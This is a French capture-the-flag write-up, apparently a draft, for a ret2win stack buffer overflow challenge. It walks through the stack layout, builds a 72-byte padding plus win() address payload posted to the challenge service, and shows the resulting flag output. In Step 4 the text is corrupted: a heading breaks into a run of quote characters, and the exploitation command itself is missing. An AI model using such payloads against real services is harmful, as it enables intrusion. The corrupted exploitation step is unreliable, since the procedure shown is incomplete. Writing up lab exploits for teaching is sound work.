---
# Imported from Obsidian: pwn-bof — Writeup.md
# Draft: ESIG final not played yet — publish after the event
title: pwn-bof
category: Pwn
ctf: ESIG Tech Arena 2026
competition: esig-tech-arena-2026
date: 2026-09-17
summary: 'L''offset total pour atteindre le saved RIP est donc :'
tags:
- esig-tech-arena-2026
- pwn
points: 200
lang: fr
draft: true
imported: true
---

### 📌 Description
> **Buffer overflow (Pwn).** Binaire fourni: no-PIE, pas de canary. Envoyez votre payload en octets bruts: `POST https://chal-22-pwn-bof.ctf.esig.tg/run` — réponse = sortie du service. Objectif: rediriger l'exécution vers la fonction `win()`.
>
> **Author** : Maxolex
**Points** : 200 pts · 18 résolutions
**First blood** : fake_flag
**Statut** : ✓ Résolu le 17/09 à 01:13 UTC
---
### Étape 1 : Reconnaissance
Je commence par interroger le service pour comprendre son fonctionnement :
```bash
curl https://chal-22-pwn-bof.ctf.esig.tg
```

**Réponse :**
```html
<h1>Pwn Gateway - BOF</h1>
<p>POST /run avec le payload brut (octets).<br>
Ex: python -c "import sys,requests;print(requests.post(URL+'/run',data=b'A'*72+(0x401236).to_bytes(8,'little')).text)"</p>
```

> **Indices fournis par le service**
> Le service me donne **directement** les informations nécessaires :
> - **Méthode** : `POST` sur `/run`
> - **Format** : payload en octets bruts
> - **Offset** : `72` octets avant d'écraser l'adresse de retour
> - **Adresse de `win()`** : `0x401236`
> - **Architecture** : x86_64 (little-endian, car `to_bytes(8, 'little')`)
C'est un challenge **pédagogique** : toutes les valeurs sont fournies dans l'énoncé du service. Pas besoin de `checksec`, `nm`, `objdump` ou `gdb`.

---

### Étape 2 : Compréhension de la vulnérabilité
Le binaire présente les caractéristiques suivantes (données dans l'énoncé) :
- **no-PIE** → les adresses sont **fixes**, `win()` est toujours à `0x401236`.
- **Pas de canary** → aucune détection de dépassement de tampon.
- **Buffer overflow** → on peut écrire au-delà du buffer et écraser l'adresse de retour (RIP).
#### Structure de la pile
```
+------------------+  <- adresse basse
|   buffer[64]     |  64 octets
+------------------+
|   saved RBP      |  8 octets
+------------------+
|   saved RIP      |  8 octets  <- on veut écraser cette valeur
+------------------+  <- adresse haute
```
L'offset total pour atteindre le saved RIP est donc :
```
64 (buffer) + 8 (saved RBP) = 72 octets
```

---
### Étape 3 : Construction du payload
Le payload est composé de deux parties :
| Partie | Taille | Contenu | Rôle |
|--------|--------|---------|------|
| 1 | 72 octets | `b'A' * 72` | Remplissage pour atteindre le saved RIP |
| 2 | 8 octets | `(0x401236).to_bytes(8, 'little')` | Nouvelle adresse de retour = `win()` |
#### Adresse `win()` en little-endian
`0x401236` sur 8 octets en little-endian donne :
```
36 12 40 00 00 00 00 00
```

En Python, `(0x401236).to_bytes(8, 'little')` génère exactement ces octets.
---
### Étape 4 : Exploitation
#### Com''''''''''''''''''''''''''''''''Réponse du serveur
```
=== Terminal d'acces coffre-fort ===
Entrez votre nom d'agent :
Nom inconnu.
Bravo ! ESIGctf{b0f_r3t2w1n_s1mpl3}
```
#### Explication du déroulement
1. Le service lit mon nom d'agent (`buffer[64]`).
2. Mon payload de 72 `A` remplit le buffer **et** écrase le saved RBP.
3. Les 8 octets suivants écrasent le saved RIP avec `0x401236`.
4. À la fin de la fonction, `ret` saute vers `win()` au lieu de revenir à `main()`.
5. `win()` s'exécute et affiche le flag.
> **Pourquoi "Nom inconnu" ?**
> Le programme affiche "Nom inconnu" car mon buffer ne contient que des `A` (pas un vrai nom). Mais peu importe : l'important est que le **retour** saute vers `win()`.
---
### 🏁 Flag
```
ESIGctf{b0f_r3t2w1n_s1mpl3}
```
